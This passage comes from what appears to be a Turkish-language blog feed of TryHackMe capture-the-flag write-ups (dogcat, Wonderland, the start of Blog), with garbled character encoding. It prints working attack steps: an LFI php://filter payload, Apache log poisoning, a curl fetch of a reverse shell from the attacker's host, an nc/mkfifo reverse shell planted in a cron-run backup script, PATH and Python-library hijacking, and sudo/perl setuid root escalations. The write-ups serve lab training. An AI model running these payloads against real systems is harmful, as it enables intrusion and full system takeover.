<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.35.38
</code></pre></div>
    <img src="/images/thm/dogcat/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Sistemde sadece 2 port aÃ§Ä±ktÄ±r. Web sayfasÄ±na giriÅŸ yapÄ±lÄ±r. Anasayfada yer alan dog ve cat butonlarÄ±na tÄ±klanarak adres Ã§ubuÄŸuna dikkatle bakÄ±lÄ±r.</p>
<p>
    <img src="/images/thm/dogcat/web1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<br>

    <img src="/images/thm/dogcat/web2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>LFI zafiyeti kontrolÃ¼ iÃ§in /etc/passwd dosyasÄ± okunmaya Ã§alÄ±ÅŸÄ±lÄ±r.</p>

    <img src="/images/thm/dogcat/lfi1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dog ve cat dÄ±ÅŸÄ±ndaki dosyalar filtreye takÄ±lÄ±maktadÄ±r. Dog ibaresi eklenerek test tekrarlanÄ±r.</p>

    <img src="/images/thm/dogcat/lfi2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dog ve cat filtresi baypass edilidiÄŸinde dosyaya otomatik olarak .php uzantÄ±sÄ± eklendiÄŸi gÃ¶rÃ¼lmektedir. Php filter kullanÄ±larak index.php dosyasÄ± okunmaya Ã§alÄ±ÅŸÄ±lÄ±r.</p>
<pre><code class="language-url" data-lang="url">?view=php://filter/convert.base64-encode/resource=./dog/../index
</code></pre><p>index.php dosyasÄ± baÅŸarÄ±lÄ± bir ÅŸekilde okunur. SonuÃ§ base64 ile decode edilir. Index.php iÃ§erisindeki php kodlarÄ± incelenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">containsStr</span>($str, $substr) {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strpos</span>($str, $substr) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>;
    }
    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])) {
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;dog&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;cat&#39;</span>)) {
            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Here you go!&#39;</span>;
            <span style="color:#66d9ef">include</span> $_GET[<span style="color:#e6db74">&#39;view&#39;</span>] <span style="color:#f92672">.</span> $ext;
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
        }
    }
<span style="color:#75715e">?&gt;</span>
</code></pre></div><p><strong>containsStr()</strong> metodu ile dog ve cat ifadeleri kontrol edilmektedir. Get isteÄŸinde <strong>ext</strong> parametresi yok ise php uzantÄ±sÄ±nÄ±n otomatik olarak eklendiÄŸi gÃ¶rÃ¼lmektedir. Ä°stek yapÄ±lÄ±rken <strong>&amp;ext</strong> kullanÄ±larak uzantÄ± ekleme kÄ±smÄ± baypass edilir.</p>
<p><em>LFI zafiyetinden RCE (Remote Code Execution) oluÅŸturabilmek iÃ§in tarayÄ±cÄ±dan LFI ile okunabilen bir dosyaya php kodu enjekte edilmelidir. Apache loglarÄ± kontrol edilir. Ã–zellikle access.log dosyasÄ±nda web servisine atÄ±lan tÃ¼m isteklerin header bilgileri kayÄ±t edilmektedir. Log dosyasÄ± okunmaya Ã§alÄ±ÅŸÄ±lÄ±r.</em></p>
<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=
</code></pre>
    <img src="/images/thm/dogcat/logpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Log iÃ§eriklerine bakÄ±ldÄ±ÄŸÄ±nda <em><strong>User-Agent</strong></em> bilgisininde kayÄ±t edildiÄŸi gÃ¶rÃ¼lmektedir. User-Agent bilgisi kod Ã§alÄ±ÅŸtÄ±rabilecek bir php kodu ile deÄŸiÅŸtirilip istek atÄ±ldÄ±ÄŸÄ±nda isteÄŸin baÅŸlÄ±k bilgisi, log dosyasÄ±na kayÄ±t edilir. Ä°ÅŸlem Burpsuite aracÄ± kullanÄ±larak yapÄ±lÄ±r.</p>

    <img src="/images/thm/dogcat/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra test iÃ§in cmd parametresine id deÄŸeri verilerek apache access log dosyasÄ± okunmaya Ã§alÄ±ÅŸÄ±lÄ±r.</p>
<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=id
</code></pre>
    <img src="/images/thm/dogcat/id.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>id komutu baÅŸarÄ±lÄ± ile Ã§alÄ±ÅŸmaktadÄ±r. Bu aÅŸamadan sonra shell baÄŸlantÄ±sÄ± iÃ§in birÃ§ok yol izlenebilir. Biz burada sisteme dosya upload ederek shell baÄŸlantÄ±sÄ± alacaÄŸÄ±z.</p>
<p>Localhostta python3 http.server modulÃ¼ kullanÄ±larak web sunucusu ayaÄŸa kaldÄ±rÄ±lÄ±r. Daha sonra</p>
<pre><code>&amp;cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php 
</code></pre><p>komutu adres Ã§ubuÄŸuna eklenir.</p>
<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=&amp;&amp;cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php
</code></pre>
    <img src="/images/thm/dogcat/server.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Ayarlanan port dinlemeye baÅŸlanÄ±r. Daha sonra tarayÄ±cÄ±dan yÃ¼klenen dosyaya istek atÄ±lÄ±r ve shell baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<p><code>http://10.10.35.38/reverse.php</code></p>

    <img src="/images/thm/dogcat/shell.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Web dizine bakÄ±ldÄ±ÄŸÄ±nda birinci flag dosyasÄ± okunur.</p>

    <img src="/images/thm/dogcat/flag1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p><code>sudo -l</code> komutu ile <em>www-data</em> kullanÄ±sÄ±nÄ±n yetkileri kontrol edilir. <strong>env</strong> komutunun parola gerektirmeden root yetkisi ile Ã§alÄ±ÅŸtÄ±rÄ±labileceÄŸi tespit edilir.</p>

    <img src="/images/thm/dogcat/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>AÅŸaÄŸÄ±daki komut ile <em><strong>env</strong></em> uygulamasÄ± ile yetki yÃ¼kseltilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/env /bin/bash 
</code></pre></div>
    <img src="/images/thm/dogcat/root1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><strong>find</strong> komutu ile sistemdeki diÄŸer flag dosyalarÄ± aranÄ±r. flag2 ve flag3 dosyalarÄ± tespit edilir. Root yetkisinde olduÄŸumuzdan flaglar kolayca okunur.</p>

    <img src="/images/thm/dogcat/flags.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Makinadaki toplam 4 adet flag dosyasÄ±ndan 3 tanesi tespit edilmiÅŸtir.</p>

    <img src="/images/thm/dogcat/makina.png"  alt="Hello Friend"  class="center"  />


<p>Makina adÄ±na dikkatlice bakÄ±ldÄ±ÄŸÄ±nda docker container iÃ§erisinde olduÄŸumuz gÃ¶rÃ¼lmektedir. DiÄŸer flag dosyasÄ± iÃ§in container dÄ±ÅŸÄ±na Ã§Ä±kmamÄ±z gerekmektedir.</p>
<p><strong>/opt</strong> dizini kontrol edildiÄŸinde backups klasÃ¶rÃ¼ dikkat Ã§ekmektedir. Dizin iÃ§eriÄŸine bakÄ±ldÄ±ÄŸÄ±nda backup.sh adÄ±nda shell script bulunmaktadÄ±r.</p>

    <img src="/images/thm/dogcat/backup.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />


<p><em>/root/container</em> dizini ile container iÃ§erisinde yer alan <em>/opt/backup</em> dizininin volume oluÅŸturularak baÄŸlandÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Dizindeki backup.sh dosyasÄ±na shell kodu eklenerek containerdan dÄ±ÅŸarÄ± Ã§Ä±kÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.62.67 5555 &gt;/tmp/f&#34;</span> &gt;&gt; backup.sh
</code></pre></div><p>nc ile 5555 port dinlenir. backup.sh dosyasÄ± containerÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± host tarafÄ±ndan dÃ¼zenli olarak Ã§alÄ±ÅŸtÄ±rÄ±lmaktadÄ±r. (Ã–yle tahmin ederek baÄŸlantÄ± gelmesi beklenir ğŸ¤«)</p>

    <img src="/images/thm/dogcat/root2.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />


<p>KÄ±sa bir sÃ¼re sonra ana makinadan shell baÄŸlantÄ±sÄ± alÄ±nÄ±r. Root dizini kontrol edilerek 4. flag dosyasÄ± okunur.</p>
<p>
    <img src="/images/thm/dogcat/rootdir.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />


<br>

    <img src="/images/thm/dogcat/rootflagg.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>THM Wonderland Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/thm-wonderland-write-up/</link>
            <pubDate>Thu, 08 Oct 2020 12:39:20 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/thm-wonderland-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki Wonderland adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.248.80  Sistemde sadece 2 port aÃ§Ä±ktÄ±r. Web sayfasÄ±na giriÅŸ yapÄ±lÄ±r.
Gobuster aracÄ± ile dizin taramasÄ± yapÄ±lÄ±r. 3 adet dizin tespit edilir.
gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt  /img dizine girilir. Dizindeki tÃ¼m resim dosyalarÄ± indirilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/wonderland">Wonderland</a> adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.248.80
</code></pre></div>
    <img src="/images/thm/wonderland/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Sistemde sadece 2 port aÃ§Ä±ktÄ±r. Web sayfasÄ±na giriÅŸ yapÄ±lÄ±r.</p>

    <img src="/images/thm/wonderland/web1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Gobuster aracÄ± ile dizin taramasÄ± yapÄ±lÄ±r. 3 adet dizin tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt 
</code></pre></div>
    <img src="/images/thm/wonderland/gobuster1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>/img dizine girilir. Dizindeki tÃ¼m resim dosyalarÄ± indirilir.</p>

    <img src="/images/thm/wonderland/img.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><strong>steghide</strong> aracÄ± ile resimler iÃ§erisine gizlenmiÅŸ olan dosyalar tespit edilir. YapÄ±lan kontrolde white_rabbit.jpg dosyasÄ± iÃ§erisinde hint.txt adlÄ± bir dosya gizlenmiÅŸtir.</p>

    <img src="/images/thm/wonderland/steg.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dosya iÃ§eriÄŸine bakÄ±ldÄ±ÄŸÄ±nda tavÅŸanÄ± takip etmemiz sÃ¶yleniyor. ğŸ‡</p>

    <img src="/images/thm/wonderland/hint.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/r</strong></em> dizin iÃ§eriÄŸi gÃ¶rÃ¼ntÃ¼lenir. Daha dizin iÃ§erisinde gobuster ile dizin taramasÄ±na devam edilir.</p>

    <img src="/images/thm/wonderland/r.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.248.80/r/ -w /usr/share/wordlists/dirb/big.txt
</code></pre></div>
    <img src="/images/thm/wonderland/gobuster2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/r</strong></em> dizini iÃ§erisinde <em><strong>/a</strong></em> dizini tespit edilir. Ä°pucunda olan tavÅŸan mevzusunun ne olduÄŸu anlaÅŸÄ±lÄ±r.ğŸ’¡TarayÄ±cÄ±ndan <em><strong>http://ipadresi/r/a/b/b/i/t</strong></em> adresine istek atÄ±lÄ±r.</p>

    <img src="/images/thm/wonderland/rabbit.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Sayfa kaynak kodlarÄ± incelendiÄŸinde gizli bir bilgi tespit edilmektedir.</p>

    <img src="/images/thm/wonderland/ssh.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Elde edilen bilgi herhangi bir login paneli tespit edilmediÄŸinde ssh baÄŸlantÄ±sÄ± iÃ§in kullanÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh alice@10.10.248.80
</code></pre></div>
    <img src="/images/thm/wonderland/ssh1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p><code>Sudo -l</code> ile kullanÄ±cÄ±nÄ±n yetkileri kontrol edilir. Rabbit kullanÄ±cÄ±sÄ± yetkisi ile <em>walrus_and_the_carpenter.py</em> dosyasÄ± Ã§alÄ±ÅŸtÄ±rÄ±lmaktadÄ±r.</p>

    <img src="/images/thm/wonderland/sudo.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>walrus_and_the_carpenter.py iÃ§eriÄŸine bakÄ±ldÄ±ÄŸÄ±nda poem deÄŸiÅŸkeni iÃ§erisinde yer alan metinden rastgele belirlenen 10 satÄ±r ekrana basÄ±lmaktadÄ±r.</p>

    <img src="/images/thm/wonderland/py.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Rabbit kullanÄ±cÄ±sÄ±na Hijacking Python Library tekniÄŸi ile geÃ§ilir. AynÄ± dizinde random.py adÄ±nda dosya oluÅŸturulur. Ä°Ã§erisine Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz kodlar yazÄ±lÄ±r. Uygulama Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda random kÃ¼tÃ¼phanesi import edilirken bizim yazdÄ±ÄŸÄ±mÄ±z kodlar import edilecektir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;/bin/bash)</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</code></pre></div><p>Rabbit kullanÄ±sÄ±nÄ±n home dizine geÃ§ilerek dosyalar listelenir. Suid biti aktif olan <em><strong>teaParty</strong></em> adÄ±nda bir dosya gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/thm/wonderland/rabbito.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dosya Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda Hatter&rsquo;Ä±n partiye geleceÄŸi bilgisi ekrana basÄ±lmakta ve uygulama kullanÄ±cÄ±dan girdi beklemektedir. Herhangi bir tuÅŸa basÄ±nca ekrana Segmentation Fault yazdÄ±rÄ±lmaktadÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 07 Oct 2020 20:06:29 +0000
Ask very nicely, and I will give you some tea while you wait for him
ls
Segmentation fault (core dumped)
</code></pre><p>Binary ayrÄ±ntÄ±lÄ± incelenmek Ã¼zere locale indirilir. Daha sonra Ghidra ile analiz edilir.</p>

    <img src="/images/thm/wonderland/ghidra.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Setuid(0x3eb) ve setguid(0x3eb) ile uid deÄŸeri Hatter (1003) kullanÄ±cÄ±sÄ±na set edilir. Burada dikkat Ã§eken echo ve date komutlarÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±dÄ±r. Echo komutu iÃ§in tam yol belirtilirken, date komutu iÃ§in path belirtilmemiÅŸtir. Date komutu PATH deÄŸiÅŸkeninde tanÄ±malanan dizinlerde sÄ±ra ile aranmaktadÄ±r.</p>
<ol>
<li><em>Date dosyasÄ± oluÅŸturulur.</em></li>
<li><em>Date dosya dizini PATH deÄŸiÅŸkenine eklenir.</em></li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rabbit@wonderland:/home/rabbit$ echo /bin/bash &gt; date
rabbit@wonderland:/home/rabbit$ chmod <span style="color:#ae81ff">777</span> date
rabbit@wonderland:/home/rabbit$ export PATH<span style="color:#f92672">=</span>/home/rabbit/:$PATH
</code></pre></div><p>Dosya Ã§alÄ±ÅŸtÄ±rÄ±larak <em><strong>hatter</strong></em> kullanÄ±cÄ±sÄ±na geÃ§iÅŸ yapÄ±lÄ±r. Hatter dizini iÃ§eriÄŸine gÃ¶z atÄ±lÄ±r.</p>

    <img src="/images/thm/wonderland/matter.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Password.txt dosyasÄ±nda yer alan parola bilgisi ile hatter kullanÄ±cÄ±sÄ±na geÃ§iÅŸ yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh hatter@localhost
</code></pre></div><p>Hatter kullanÄ±cÄ±sÄ± yetkileri ile sistem hakkÄ±nda bilgi toplamak iÃ§in LinEnum betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Betik Ã§Ä±ktÄ±sÄ±nda capability yetkileri olan dosyalar dikkat Ã§ekmektedir.</p>

    <img src="/images/thm/wonderland/cap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Perl uygulamasÄ±nÄ±n <em>setuid</em> ile yetkilerinin yÃ¼kseltilerek kernele sistem Ã§aÄŸÄ±rÄ±sÄ± yapÄ±labilceÄŸi tespit edilmektedir. <em><strong>uid deÄŸeri 0 (root)</strong></em> set edilir ve /bin/bash uygulamasÄ± Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/bin/perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
</code></pre></div>
    <img src="/images/thm/wonderland/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em>/root</em> dizini iÃ§erisinde yer alan user.txt dosyasÄ±,</p>

    <img src="/images/thm/wonderland/userflag.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>ve <em>/home/alice</em> dizininde yer alan root.txt dosyalarÄ± okunarak makina Ã§Ã¶zÃ¼mlemesi tamamlanÄ±r.</p>

    <img src="/images/thm/wonderland/rootflag.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>THM Blog Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/thm-blog-write-up/</link>
            <pubDate>Wed, 07 Oct 2020 11:49:09 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/thm-blog-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki Blog adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
Ä°lk olarak tasarÄ±mcÄ± tarafÄ±ndan belirtilen domain adÄ± /etc/hosts dosyasÄ±na eklenir.
1. KeÅŸif AÅŸamasÄ± Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.25.92  Samba servisinde anonymous olarak paylaÅŸÄ±ma aÃ§Ä±k olan dizinler kontrol edilir.
â”€[barcode@parrot]â”€[~]$ smbclient -L //10.10.25.92 Enter WORKGROUP\barcode&amp;#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy&amp;#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available BillySMB klasÃ¶rÃ¼ iÃ§eriÄŸine bakÄ±lÄ±r.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/blog">Blog</a> adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</p>
<p>Ä°lk olarak tasarÄ±mcÄ± tarafÄ±ndan belirtilen domain adÄ± /etc/hosts dosyasÄ±na eklenir.</p>

    <img src="/images/thm/blog/desc.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.25.92 
</code></pre></div>
    <img src="/images/thm/blog/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Samba servisinde anonymous olarak paylaÅŸÄ±ma aÃ§Ä±k olan dizinler kontrol edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">â”€[barcode@parrot]â”€[~]$ smbclient -L //10.10.25.92
Enter WORKGROUP\barcode&#39;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy&#39;s local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
</code></pre></div><p>BillySMB klasÃ¶rÃ¼ iÃ§eriÄŸine bakÄ±lÄ±r. PaylaÅŸÄ±ma aÃ§Ä±k olan dosyalar <strong>get</strong> komutu ile indirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">â”€[barcode@parrot]â”€[~]$ smbclient  //10.10.25.92/BillySMB
Enter WORKGROUP\barcode&#39;s password: 
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue May 26 13:17:05 2020
  ..                                  D        0  Tue May 26 12:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 13:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 13:13:45 2020
  check-this.png                      N     3082  Tue May 26 13:13:43 2020

		15413192 blocks of size 1024. 9788764 blocks available
smb: \&gt; get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (30.9 KiloBytes/sec) (average 30.9 KiloBytes/sec)
smb: \&gt; get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (871.4 KiloBytes/sec) (average 508.1 KiloBytes/sec)
smb: \&gt; get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (9.9 KiloBytes/sec) (average 453.0 KiloBytes/sec)
</code></pre></div><p><em>Alice-White-Rabbit.jpg</em> dosyasÄ±nda gizli bir mesaj olduÄŸu steghide aracÄ± ile tespit edilir. Daha sonra yine aynÄ± araÃ§ ile rabbit_hole.txt dosyasÄ± export edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">â”€[barcode@parrot]â”€[~]$ steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to &quot;rabbit_hole.txt&quot;.
</code></pre><p>Ä°Ã§eriÄŸine bakÄ±ldÄ±ÄŸÄ±nda tuzak olduÄŸu gÃ¶rÃ¼lmektedir. ğŸ˜¥</p>
<pre><code class="language-terminal" data-lang="terminal">â”€[barcode@parrot]â”€[~]$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
</code></pre><p>AraÅŸtÄ±rmalara Web servisi Ã¼zerinden devam edilir. 80. portta Wordpress uygulamasÄ± Ã§alÄ±ÅŸmaktadÄ±r.</p>

    <img src="/images/thm/blog/webpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Robots.txt dosyasÄ± iÃ§eriÄŸine bakÄ±lÄ±r.</p>

    <img src="/images/thm/blog/robots.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Wordpress uygulamalarÄ±nda kolaylÄ±kla bilgi toplamamÄ±zÄ± saÄŸlayan wpscan aracÄ± ile tarama yapÄ±lÄ±r. Tarama sonucunda dikkat Ã§eken bilgiler aÅŸaÄŸÄ±dadÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://blog.thm --enumerate
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">
[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%


[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
